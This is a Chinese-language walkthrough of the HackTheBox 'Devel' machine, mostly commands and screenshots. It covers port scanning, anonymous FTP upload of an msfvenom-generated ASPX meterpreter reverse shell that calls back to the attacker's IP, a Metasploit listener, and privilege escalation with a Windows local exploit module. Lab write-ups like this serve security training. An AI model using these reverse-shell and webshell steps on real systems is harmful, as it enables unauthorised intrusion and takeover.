靶机信息

靶机地址:

```
 https://app.hackthebox.com/machines/Devel
```

靶场: HackTheBox.com

靶机名称:Devel

难度: 简单

提示信息:

```
 无
```

目标: user.txt和root.txt

## 实验环境

```
 攻击机:Kali 10.10.16.3
靶机:10.10.10.5
```

## 信息收集

### 扫描端口

扫描靶机开放的服务端口

```
 sudo masscan \-p1-65535 \-e tun0  10.10.10.5
```

![](../Images/87d0457127f5f4db4aecd1c2ab99b01f.png)

```
 sudo nmap \-sC \-sV \-p 21,80 10.10.10.5 \-oN nmap.log
```

![](../Images/922d4fa6f33e519099874ab711b26efb.png)

从扫描结果中看到ftp允许匿名访问，80端口使用IIS7.5提供服务，先来看看21端口

```
 ftp 10.10.10.5
```

![](../Images/33f8281c8171e219e8d81daeb44f42ad.png)

![](../Images/39730a75767b231c0890385e51ca0775.png)

ftp中只有IIS默认文件位置应该在IIS的根目录，访问80端口同样是IIS的默认页面，可以看出IIS与FTP在同一个目录下，那就可以利用ftp上传webshell

## Web渗透

使用msfvenom生成后门

```
 msfvenom \-p windows/meterpreter/reverse\_tcp LHOST\=10.10.16.3 LPORT\=4444 \-f aspx >shell.aspx
```

![](../Images/513b7b66ed8eb3a34c2b11bae1b873fa.png)

msf中设置监听

```
 msfconsole
use exploit/multi/handler
options
set payload windows/meterpreter/reverse\_tcp
set LHOST 10.10.16.3
set LPORT 4444
run
```

![](../Images/d1ed5a3f1493d350f6b6e972b85c2ddf.png)

上传webshell到ftp根目录中

```

ftp 10.10.10.5
```

![](../Images/3387fdf9e478a0b698634058abdababb.png)

上传完成，访问webshell地址

```
http://10.10.10.5/shell.aspx
```

![](../Images/c0d911d8f44739ab1e79ad5d69c168cc.png)

反弹成功，查看权限收集敏感信息

![](../Images/091ff3120094c829d59de1f811b80969.png)

将后门自动迁移到稳定的进程中

```
run post/windows/manage/migrate
```

![](../Images/0c8415c56e63ec01754b21d1b903edfd.png)

提权

```


background
```

![](../Images/71777c812e8bd7952339c34f4eaa5201.png)

这些都是提示可能存在的漏洞，随便找一个验证下

```


use exploit/windows/local/ntusermndragover
```

![](../Images/85b2b632e968cb2f341723bf5b75ceeb.png)

![](../Images/81a806e9b7e6d40ab35359d5cdf2b066.png)

提权成功，来找下flag

```


shell
```

![](../Images/6f8cf9e5ffc943f8196f74ab0b1fd349.png)

拿到flag，游戏结束

![](../Images/cd3610eb0f86d88858e60cdd707eb1d4.png)
